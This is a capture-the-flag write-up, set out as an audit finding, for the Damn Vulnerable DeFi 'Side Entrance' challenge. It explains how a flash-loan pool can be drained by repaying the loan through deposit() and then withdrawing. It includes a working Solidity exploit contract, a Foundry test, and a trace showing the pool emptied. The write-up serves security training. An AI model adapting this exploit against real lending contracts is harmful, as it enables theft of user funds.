# Damn Vulnerable Defi - Side Entrance
- Scope
    - SideEntranceLenderPool.sol
- Tools
    - [Foundry](https://github.com/foundry-rs/foundry)

# Findings

## `flashLoan()` function allow users to call a custom malicious `execute()`

### Summary
`flashLoan()` function allow users to call a custom `execute()` which can be malicious. We can create the custom `execute()` that first perform a flash loan and then deposit the amount from the pool into the pool, but at the same time fake increases the deposit `balances()` of the msg.sender. After which, the user can withdraw the amount from the pool.

### Vulnerability Details
The `flashLoan()` function allow users to call a custom `execute()`, which can resulted in malicious transactions.
```diff
function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

+        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore) {
            revert RepayFailed();
        }
    }
```
### Impact/Proof of Concept
1. Create custom execute()
2. Call flashLoan() and which will call custom execute
3. custom execute() will perform a deposit of flashLoan amount and increases msg.sender's deposit
4. It fulfills the balance check as ETH didnt leave the pool
```
function test_sideEntrance() public checkSolvedByPlayer {
        console.log("pool beforeBalance: ", address(pool).balance / 1e18);
        Exploit attacker = new Exploit(pool);
        attacker.loan(address(recovery));
        console.log("pool aftereBalance: ", address(pool).balance / 1e18);
        console.log("recovery Balance: ", address(recovery).balance / 1e18);
    }

contract Exploit is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;
    
    constructor(SideEntranceLenderPool _pool){
        pool = _pool;
    }

    receive() external  payable {}
    
    // Custom execute() function, that deposits the flash loan amount back into the pool.balances
    // 'fake' increase of the user's deposit balances()
    function execute() external payable {
        pool.deposit{value:msg.value}();
    }

    function loan(address target) external {
        uint256 amount = address(pool).balance;
        pool.flashLoan(amount); // Loan amount and then deposit the amount
        pool.withdraw(); // Withdraw the amount from pool
        target.call{value: amount}(""); // Then transfer the amount from this contract to recovery
    }
}
```

Results
```diff
[PASS] test_sideEntrance() (gas: 265419)
Logs:
  pool beforeBalance:  1000
  pool aftereBalance:  0
  recovery Balance:  1000

Traces:
  [265419] SideEntranceChallenge::test_sideEntrance()
    ├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C])
    │   └─ ← [Return] 
    ├─ [0] console::log("pool beforeBalance: ", 1000) [staticcall]
    │   └─ ← [Stop] 
    ├─ [149765] → new Exploit@0xce110ab5927CC46905460D930CCa0c6fB4666219
    │   └─ ← [Return] 525 bytes of code
    ├─ [82944] Exploit::loan(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa])
    │   ├─ [38434] SideEntranceLenderPool::flashLoan(1000000000000000000000 [1e21])
    │   │   ├─ [31091] Exploit::execute{value: 1000000000000000000000}()
    │   │   │   ├─ [23793] SideEntranceLenderPool::deposit{value: 1000000000000000000000}()
    │   │   │   │   ├─ emit Deposit(who: Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount: 1000000000000000000000 [1e21])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Stop] 
    │   ├─ [8787] SideEntranceLenderPool::withdraw()
    │   │   ├─ emit Withdraw(who: Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount: 1000000000000000000000 [1e21])
    │   │   ├─ [55] Exploit::receive{value: 1000000000000000000000}()
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Stop] 
    │   ├─ [0] recovery::fallback{value: 1000000000000000000000}()
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [0] console::log("pool aftereBalance: ", 0) [staticcall]
    │   └─ ← [Stop] 
    ├─ [0] console::log("recovery Balance: ", 1000) [staticcall]
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [0] VM::assertEq(0, 0, "Pool still has ETH") [staticcall]
    │   └─ ← [Return] 
    ├─ [0] VM::assertEq(1000000000000000000000 [1e21], 1000000000000000000000 [1e21], "Not enough ETH in recovery account") [staticcall]
    │   └─ ← [Return] 
    └─ ← [Stop] 

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.12ms (270.17µs CPU time)

Ran 1 test suite in 792.85ms (1.12ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```
